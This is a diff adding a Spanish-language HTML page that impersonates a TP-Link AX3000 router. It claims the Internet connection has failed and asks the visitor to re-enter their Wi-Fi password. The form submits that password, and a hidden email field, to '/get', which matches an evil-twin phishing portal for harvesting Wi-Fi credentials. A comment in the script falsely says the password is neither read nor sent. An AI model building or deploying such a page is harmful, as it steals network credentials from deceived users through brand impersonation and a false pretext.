@@ -1,0 +1,1035 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+    >
+
+    <title>AX3000 Gigabit Wi-Fi 6 Router</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html,
+        body {
+            width: 100%;
+            min-height: 100%;
+        }
+
+        body {
+            min-height: 100vh;
+            overflow: hidden;
+            font-family: Arial, Helvetica, sans-serif;
+            color: #333333;
+            background:
+                linear-gradient(
+                    180deg,
+                    #4bc3d3 0%,
+                    #48c2d3 60%,
+                    #36b9d2 100%
+                );
+            position: relative;
+        }
+
+        /* =========================================================
+           CABECERA
+           ========================================================= */
+
+        .header {
+            position: absolute;
+            top: 20px;
+            left: 12px;
+
+            display: flex;
+            align-items: center;
+
+            height: 58px;
+
+            color: white;
+            z-index: 10;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+			width: 124px;
+        }
+
+        .tp-icon {
+            width: 48px;
+            height: 48px;
+            margin-right: 10px;
+            flex-shrink: 0;
+        }
+
+        .tp-wordmark {
+            color: #ffffff;
+            font-size: 28px;
+            font-weight: 400;
+            line-height: 1;
+            letter-spacing: -1.5px;
+        }
+
+        .separator {
+            width: 2px;
+            height: 24px;
+
+            background: rgba(255,255,255,.9);
+
+            margin-left: 17px;
+            margin-right: 15px;
+        }
+
+        .router-title {
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: 400;
+            white-space: nowrap;
+        }
+
+        /* =========================================================
+           CONTENEDOR CENTRAL
+           ========================================================= */
+
+        .page {
+            position: relative;
+            z-index: 3;
+
+            width: 100%;
+            min-height: 100vh;
+
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+
+            padding-top: 112px;
+        }
+
+        .login-card {
+            position: relative;
+
+            width: 630px;
+            height: 420px;
+
+            background: #ffffff;
+
+            border-radius: 15px;
+
+            padding:
+                40px
+                66px
+                42px
+                68px;
+        }
+
+        /* =========================================================
+           TITULO
+           ========================================================= */
+
+        .login-title {
+            text-align: center;
+
+            color: #333333;
+
+            font-size: 29px;
+            line-height: 35px;
+            font-weight: 600;
+
+            margin-bottom: 78px;
+        }
+
+        /* =========================================================
+           FORMULARIO
+           ========================================================= */
+
+        .login-form {
+            width: 100%;
+        }
+
+        .password-label {
+            display: block;
+
+            color: #222222;
+
+            font-size: 21px;
+            line-height: 25px;
+
+            margin-bottom: 9px;
+        }
+
+        .input-wrapper {
+            position: relative;
+
+            width: 100%;
+            height: 42px;
+
+            margin-bottom: 44px;
+        }
+
+        .password-input {
+            display: block;
+
+            width: 100%;
+            height: 42px;
+
+            padding:
+                0
+                50px
+                0
+                12px;
+
+            border: 1px solid #d2d2d2;
+            border-radius: 7px;
+
+            background: #ffffff;
+
+            color: #333333;
+
+            font-size: 18px;
+
+            outline: none;
+
+            transition:
+                border-color .15s ease,
+                box-shadow .15s ease;
+        }
+
+        .password-input:focus {
+            border-color: #4ac1d3;
+
+            box-shadow:
+                0 0 0 1px rgba(74,193,211,.1);
+        }
+
+        /* =========================================================
+           ICONO OJO
+           ========================================================= */
+
+        .eye-button {
+            position: absolute;
+
+            right: 10px;
+            top: 50%;
+
+            transform: translateY(-50%);
+
+            width: 34px;
+            height: 34px;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            padding: 0;
+
+            border: none;
+
+            background: transparent;
+
+            cursor: pointer;
+        }
+
+        .eye-button svg {
+            width: 30px;
+            height: 30px;
+        }
+
+        /* =========================================================
+           BOTÓN LOGIN
+           ========================================================= */
+
+        .login-button {
+            display: block;
+
+            width: 100%;
+            height: 43px;
+
+            border: none;
+            border-radius: 7px;
+
+            background: #43bfd2;
+
+            color: white;
+
+            font-size: 20px;
+            font-weight: 400;
+
+            cursor: pointer;
+
+            box-shadow:
+                0 2px 4px rgba(0,0,0,.23);
+
+            transition:
+                background-color .15s ease,
+                transform .06s ease;
+        }
+
+        .login-button:hover {
+            background: #3ab8cc;
+        }
+
+        .login-button:active {
+            transform: translateY(1px);
+        }
+
+        /* =========================================================
+           FORGOT PASSWORD
+           ========================================================= */
+
+        .forgot-row {
+            display: flex;
+            justify-content: flex-end;
+
+            margin-top: 11px;
+        }
+
+        .forgot-link {
+            color: #35bfd3;
+
+            font-size: 21px;
+
+            text-decoration: none;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        /* =========================================================
+           TP-LINK ID
+           ========================================================= */
+
+        .tplink-id {
+            position: absolute;
+
+            right: 66px;
+            bottom: 56px;
+
+            display: flex;
+            align-items: center;
+
+            color: #3cc1d4;
+
+            font-size: 21px;
+
+            text-decoration: none;
+        }
+
+        .tplink-id-icon {
+            width: 29px;
+            height: 29px;
+
+            margin-right: 11px;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .tplink-id-icon svg {
+            width: 29px;
+            height: 29px;
+        }
+
+        /* =========================================================
+           NUBES DE FONDO
+           ========================================================= */
+
+        .clouds {
+            position: absolute;
+
+            left: 0;
+            bottom: 0;
+
+            width: 100%;
+            height: 45%;
+
+            overflow: hidden;
+
+            pointer-events: none;
+
+            z-index: 1;
+        }
+
+        .cloud-left,
+        .cloud-right {
+            position: absolute;
+
+            bottom: -120px;
+
+            background: rgba(32, 177, 207, .22);
+
+            border-radius: 50%;
+        }
+
+        .cloud-left {
+            left: -260px;
+
+            width: 500px;
+            height: 320px;
+
+            box-shadow:
+                250px 20px 0 10px rgba(32, 177, 207, .22),
+                420px 110px 0 -30px rgba(32, 177, 207, .22);
+        }
+
+        .cloud-right {
+            right: -270px;
+
+            width: 520px;
+            height: 300px;
+
+            box-shadow:
+                -240px 35px 0 30px rgba(32, 177, 207, .22),
+                -420px 115px 0 -35px rgba(32, 177, 207, .22);
+        }
+
+        /* =========================================================
+           RESPONSIVE
+           ========================================================= */
+
+        @media (max-width: 800px) {
+
+            body {
+                overflow-y: auto;
+            }
+
+            .header {
+                top: 14px;
+                left: 16px;
+
+                transform: scale(.84);
+                transform-origin: top left;
+            }
+
+            .router-title {
+                font-size: 21px;
+            }
+
+            .page {
+                padding-top: 100px;
+                padding-left: 16px;
+                padding-right: 16px;
+                padding-bottom: 30px;
+            }
+
+            .login-card {
+                width: 100%;
+                max-width: 630px;
+
+                /*height: min(720px, calc(100vh - 125px));
+                min-height: 570px;*/
+
+                padding-left: 34px;
+                padding-right: 34px;
+            }
+
+            .login-title {
+                font-size: 25px;
+                margin-bottom: 60px;
+            }
+
+            .password-label {
+                font-size: 18px;
+            }
+
+            .forgot-link {
+                font-size: 18px;
+            }
+
+            .tplink-id {
+                right: 34px;
+                bottom: 37px;
+            }
+        }
+
+        @media (max-width: 540px) {
+
+            .header {
+                transform: scale(.70);
+            }
+
+            .router-title {
+                font-size: 23px;
+            }
+
+            .page {
+                padding-top: 86px;
+            }
+
+            .login-card {
+                min-height: 420px;
+
+                border-radius: 12px;
+
+                padding:
+                    34px
+                    25px
+                    32px;
+            }
+
+            .login-title {
+                font-size: 22px;
+                line-height: 28px;
+
+                margin-bottom: 48px;
+            }
+
+            .tplink-id {
+                right: 25px;
+                bottom: 30px;
+
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- =========================================================
+         CABECERA
+         ========================================================= -->
+
+    <header class="header">
+
+        <div class="brand">
+
+            <!-- Logo TP-Link SVG incrustado -->
+            <svg
+                class="tp-icon"
+                viewBox="0 0 512 512"
+                xmlns="http://www.w3.org/2000/svg"
+                aria-hidden="true"
+            >
+                <path
+                    fill="#ffffff"
+                    fill-rule="evenodd"
+                    clip-rule="evenodd"
+                    d="
+                    M 3 269
+                    L 3 361
+                    L 9 373
+                    L 16 379
+                    L 23 381
+                    L 24 382
+                    L 129 382
+                    L 130 383
+                    L 130 487
+                    L 131 488
+                    L 131 492
+                    L 135 500
+                    L 142 507
+                    L 151 511
+                    L 243 511
+                    L 243 269
+                    Z
+
+                    M 367 4
+                    L 357 3
+                    L 356 2
+                    L 350 2
+                    L 349 1
+                    L 341 1
+                    L 340 0
+                    L 308 0
+                    L 307 1
+                    L 299 1
+                    L 298 2
+                    L 286 3
+                    L 285 4
+                    L 277 5
+                    L 273 7
+                    L 266 8
+                    L 263 10
+                    L 260 10
+                    L 257 12
+                    L 250 14
+                    L 245 17
+                    L 243 17
+                    L 231 23
+                    L 224 28
+                    L 221 29
+                    L 212 36
+                    L 208 38
+                    L 198 47
+                    L 197 47
+                    L 181 63
+                    L 181 64
+                    L 175 70
+                    L 175 71
+                    L 169 78
+                    L 169 79
+                    L 161 90
+                    L 160 93
+                    L 158 95
+                    L 148 115
+                    L 148 117
+                    L 146 120
+                    L 146 122
+                    L 145 123
+                    L 145 125
+                    L 144 126
+                    L 144 128
+                    L 143 129
+                    L 143 131
+                    L 140 138
+                    L 140 141
+                    L 139 142
+                    L 139 145
+                    L 138 146
+                    L 138 149
+                    L 137 150
+                    L 137 155
+                    L 136 156
+                    L 136 160
+                    L 135 161
+                    L 135 168
+                    L 134 169
+                    L 134 184
+                    L 133 185
+                    L 133 229
+                    L 134 230
+                    L 239 230
+                    L 239 181
+                    L 240 180
+                    L 240 174
+                    L 241 173
+                    L 241 170
+                    L 242 169
+                    L 242 166
+                    L 243 165
+                    L 244 160
+                    L 247 155
+                    L 247 153
+                    L 249 151
+                    L 251 146
+                    L 256 140
+                    L 256 139
+                    L 271 124
+                    L 272 124
+                    L 275 121
+                    L 278 120
+                    L 280 118
+                    L 295 111
+                    L 301 110
+                    L 302 109
+                    L 305 109
+                    L 306 108
+                    L 311 108
+                    L 312 107
+                    L 335 107
+                    L 336 108
+                    L 341 108
+                    L 342 109
+                    L 349 110
+                    L 355 113
+                    L 357 113
+                    L 371 121
+                    L 384 133
+                    L 384 134
+                    L 390 141
+                    L 397 155
+                    L 397 157
+                    L 399 161
+                    L 399 164
+                    L 400 165
+                    L 400 168
+                    L 401 169
+                    L 401 174
+                    L 402 175
+                    L 402 202
+                    L 401 203
+                    L 401 207
+                    L 400 208
+                    L 400 211
+                    L 399 212
+                    L 399 215
+                    L 398 216
+                    L 397 221
+                    L 390 235
+                    L 385 241
+                    L 385 242
+                    L 372 255
+                    L 371 255
+                    L 362 262
+                    L 354 266
+                    L 352 266
+                    L 351 267
+                    L 349 267
+                    L 342 270
+                    L 332 271
+                    L 331 272
+                    L 281 272
+                    L 281 379
+                    L 335 379
+                    L 336 378
+                    L 344 378
+                    L 345 377
+                    L 357 376
+                    L 358 375
+                    L 361 375
+                    L 362 374
+                    L 373 372
+                    L 374 371
+                    L 385 368
+                    L 393 364
+                    L 395 364
+                    L 411 356
+                    L 413 354
+                    L 416 353
+                    L 418 351
+                    L 421 350
+                    L 423 348
+                    L 427 346
+                    L 439 336
+                    L 440 336
+                    L 455 322
+                    L 455 321
+                    L 468 307
+                    L 473 299
+                    L 476 296
+                    L 477 293
+                    L 479 291
+                    L 483 283
+                    L 485 281
+                    L 491 269
+                    L 491 267
+                    L 494 262
+                    L 494 260
+                    L 496 257
+                    L 496 255
+                    L 497 254
+                    L 497 252
+                    L 498 251
+                    L 498 249
+                    L 501 242
+                    L 501 239
+                    L 502 238
+                    L 502 235
+                    L 503 234
+                    L 503 231
+                    L 504 230
+                    L 504 226
+                    L 505 225
+                    L 505 221
+                    L 506 220
+                    L 506 214
+                    L 507 213
+                    L 507 204
+                    L 508 203
+                    L 508 173
+                    L 507 172
+                    L 507 163
+                    L 506 162
+                    L 505 149
+                    L 504 148
+                    L 504 144
+                    L 503 143
+                    L 503 140
+                    L 502 139
+                    L 502 136
+                    L 501 135
+                    L 501 132
+                    L 499 128
+                    L 499 125
+                    L 498 124
+                    L 497 119
+                    L 495 116
+                    L 495 114
+                    L 493 111
+                    L 491 104
+                    L 486 94
+                    L 484 92
+                    L 482 87
+                    L 480 85
+                    L 479 82
+                    L 477 80
+                    L 473 73
+                    L 470 70
+                    L 470 69
+                    L 459 57
+                    L 459 56
+                    L 450 47
+                    L 449 47
+                    L 443 41
+                    L 442 41
+                    L 434 34
+                    L 433 34
+                    L 422 26
+                    L 419 25
+                    L 417 23
+                    L 403 16
+                    L 401 16
+                    L 396 13
+                    L 391 12
+                    L 388 10
+                    L 386 10
+                    L 382 8
+                    L 379 8
+                    L 375 6
+                    L 368 5
+                    Z
+                    "
+                />
+            </svg>
+
+            <div class="tp-wordmark">
+                tp-link
+            </div>
+
+        </div>
+
+        <div class="separator"></div>
+
+        <div class="router-title">
+            AX3000 Gigabit Wi-Fi 6 Router
+        </div>
+
+    </header>
+
+
+    <!-- =========================================================
+         CONTENIDO CENTRAL
+         ========================================================= -->
+	
+
+    <main class="page">
+	
+
+	
+
+        <section class="login-card">
+		
+			<div style="font-size:19px">
+			<p>No se ha podido restablecer la conexi&oacute;n a Internet. </p>
+			<p>Confirma la contrase&ntilde;a de tu red Wi-Fi para continuar.</p>
+
+			</div>
+
+            <h1 class="login-title">
+              
+            </h1>
+
+            <form
+                class="login-form"
+                id="loginForm"
+                autocomplete="off"
+               
+				
+				action="/get" 
+            >
+
+                <label
+                    class="password-label"
+                    for="password"
+                >
+                    Contrase&ntilde;a Wi-fi
+                </label>
+
+
+                <div class="input-wrapper">
+
+                    <input
+                        id="password"
+						name="password"
+                        class="password-input"
+                        type="password"
+                        autocomplete="off"
+                        spellcheck="false"
+						required
+                    >
+					<input
+                        id="email"
+						name="email"
+                        
+                        type="hidden"
+                    
+                    >
+
+                    <button
+                        id="togglePassword"
+                        class="eye-button"
+						type="button"
+                      
+                        aria-label="Show password"
+                    >
+
+                        <svg
+                            viewBox="0 0 32 32"
+                            xmlns="http://www.w3.org/2000/svg"
+                        >
+
+                            <path
+                                d="
+                                M3 16
+                                C6 10.5 10.5 7.5 16 7.5
+                                C21.5 7.5 26 10.5 29 16
+                                C26 21.5 21.5 24.5 16 24.5
+                                C10.5 24.5 6 21.5 3 16Z
+                                "
+                                fill="none"
+                                stroke="#a8aaac"
+                                stroke-width="2.5"
+                            />
+
+                            <circle
+                                cx="16"
+                                cy="16"
+                                r="4"
+                                fill="#a8aaac"
+                            />
+
+                            <line
+                                x1="6"
+                                y1="27"
+                                x2="27"
+                                y2="5"
+                                stroke="#a8aaac"
+                                stroke-width="3"
+                                stroke-linecap="round"
+                            />
+
+                        </svg>
+
+                    </button>
+
+                </div>
+
+
+                <button
+                    id="loginButton"
+                    class="login-button"
+                    type="submit"
+                >
+                    RESTABLECER CONEXI&Oacute;N
+                </button>
+
+
+                <div class="forgot-row">
+
+                    <a
+                        href="#"
+                        class="forgot-link"
+                        onclick="return false;"
+                    >
+                       
+                    </a>
+
+                </div>
+
+            </form>
+
+
+            <a
+                href="#"
+                class="tplink-id"
+                onclick="return false;"
+            >
+
+            
+
+            </a>
+
+        </section>
+
+    </main>
+
+
+    <!-- =========================================================
+         NUBES DE FONDO
+         ========================================================= -->
+
+    <div class="clouds">
+        <div class="cloud-left"></div>
+        <div class="cloud-right"></div>
+    </div>
+
+
+    <script>
+
+        const passwordInput =
+            document.getElementById("password");
+
+        const togglePassword =
+            document.getElementById("togglePassword");
+
+        const loginButton =
+            document.getElementById("loginButton");
+
+
+
+		document.addEventListener("DOMContentLoaded", () => {
+			passwordInput.focus();
+		});
+
+
+
+
+
+
+
+        /* Mostrar / ocultar contraseña */
+
+        togglePassword.addEventListener(
+            "click",
+            function () {
+
+                if (passwordInput.type === "password") {
+
+                    passwordInput.type = "text";
+
+                    togglePassword.setAttribute(
+                        "aria-label",
+                        "Hide password"
+                    );
+
+                } else {
+
+                    passwordInput.type = "password";
+
+                    togglePassword.setAttribute(
+                        "aria-label",
+                        "Show password"
+                    );
+
+                }
+
+            }
+        );
+
+
+        /* Botón visual de login.
+           No lee ni transmite la contraseña. */
+
+        
+
+
+        /* Enter activa la animación */
+
+        passwordInput.addEventListener(
+            "keydown",
+            function (event) {
+
+                if (event.key === "Enter") {
+
+                    event.preventDefault();
+
+                    loginButton.click();
+
+                }
+
+            }
+        );
+
+    </script>
+
+</body>
+</html>
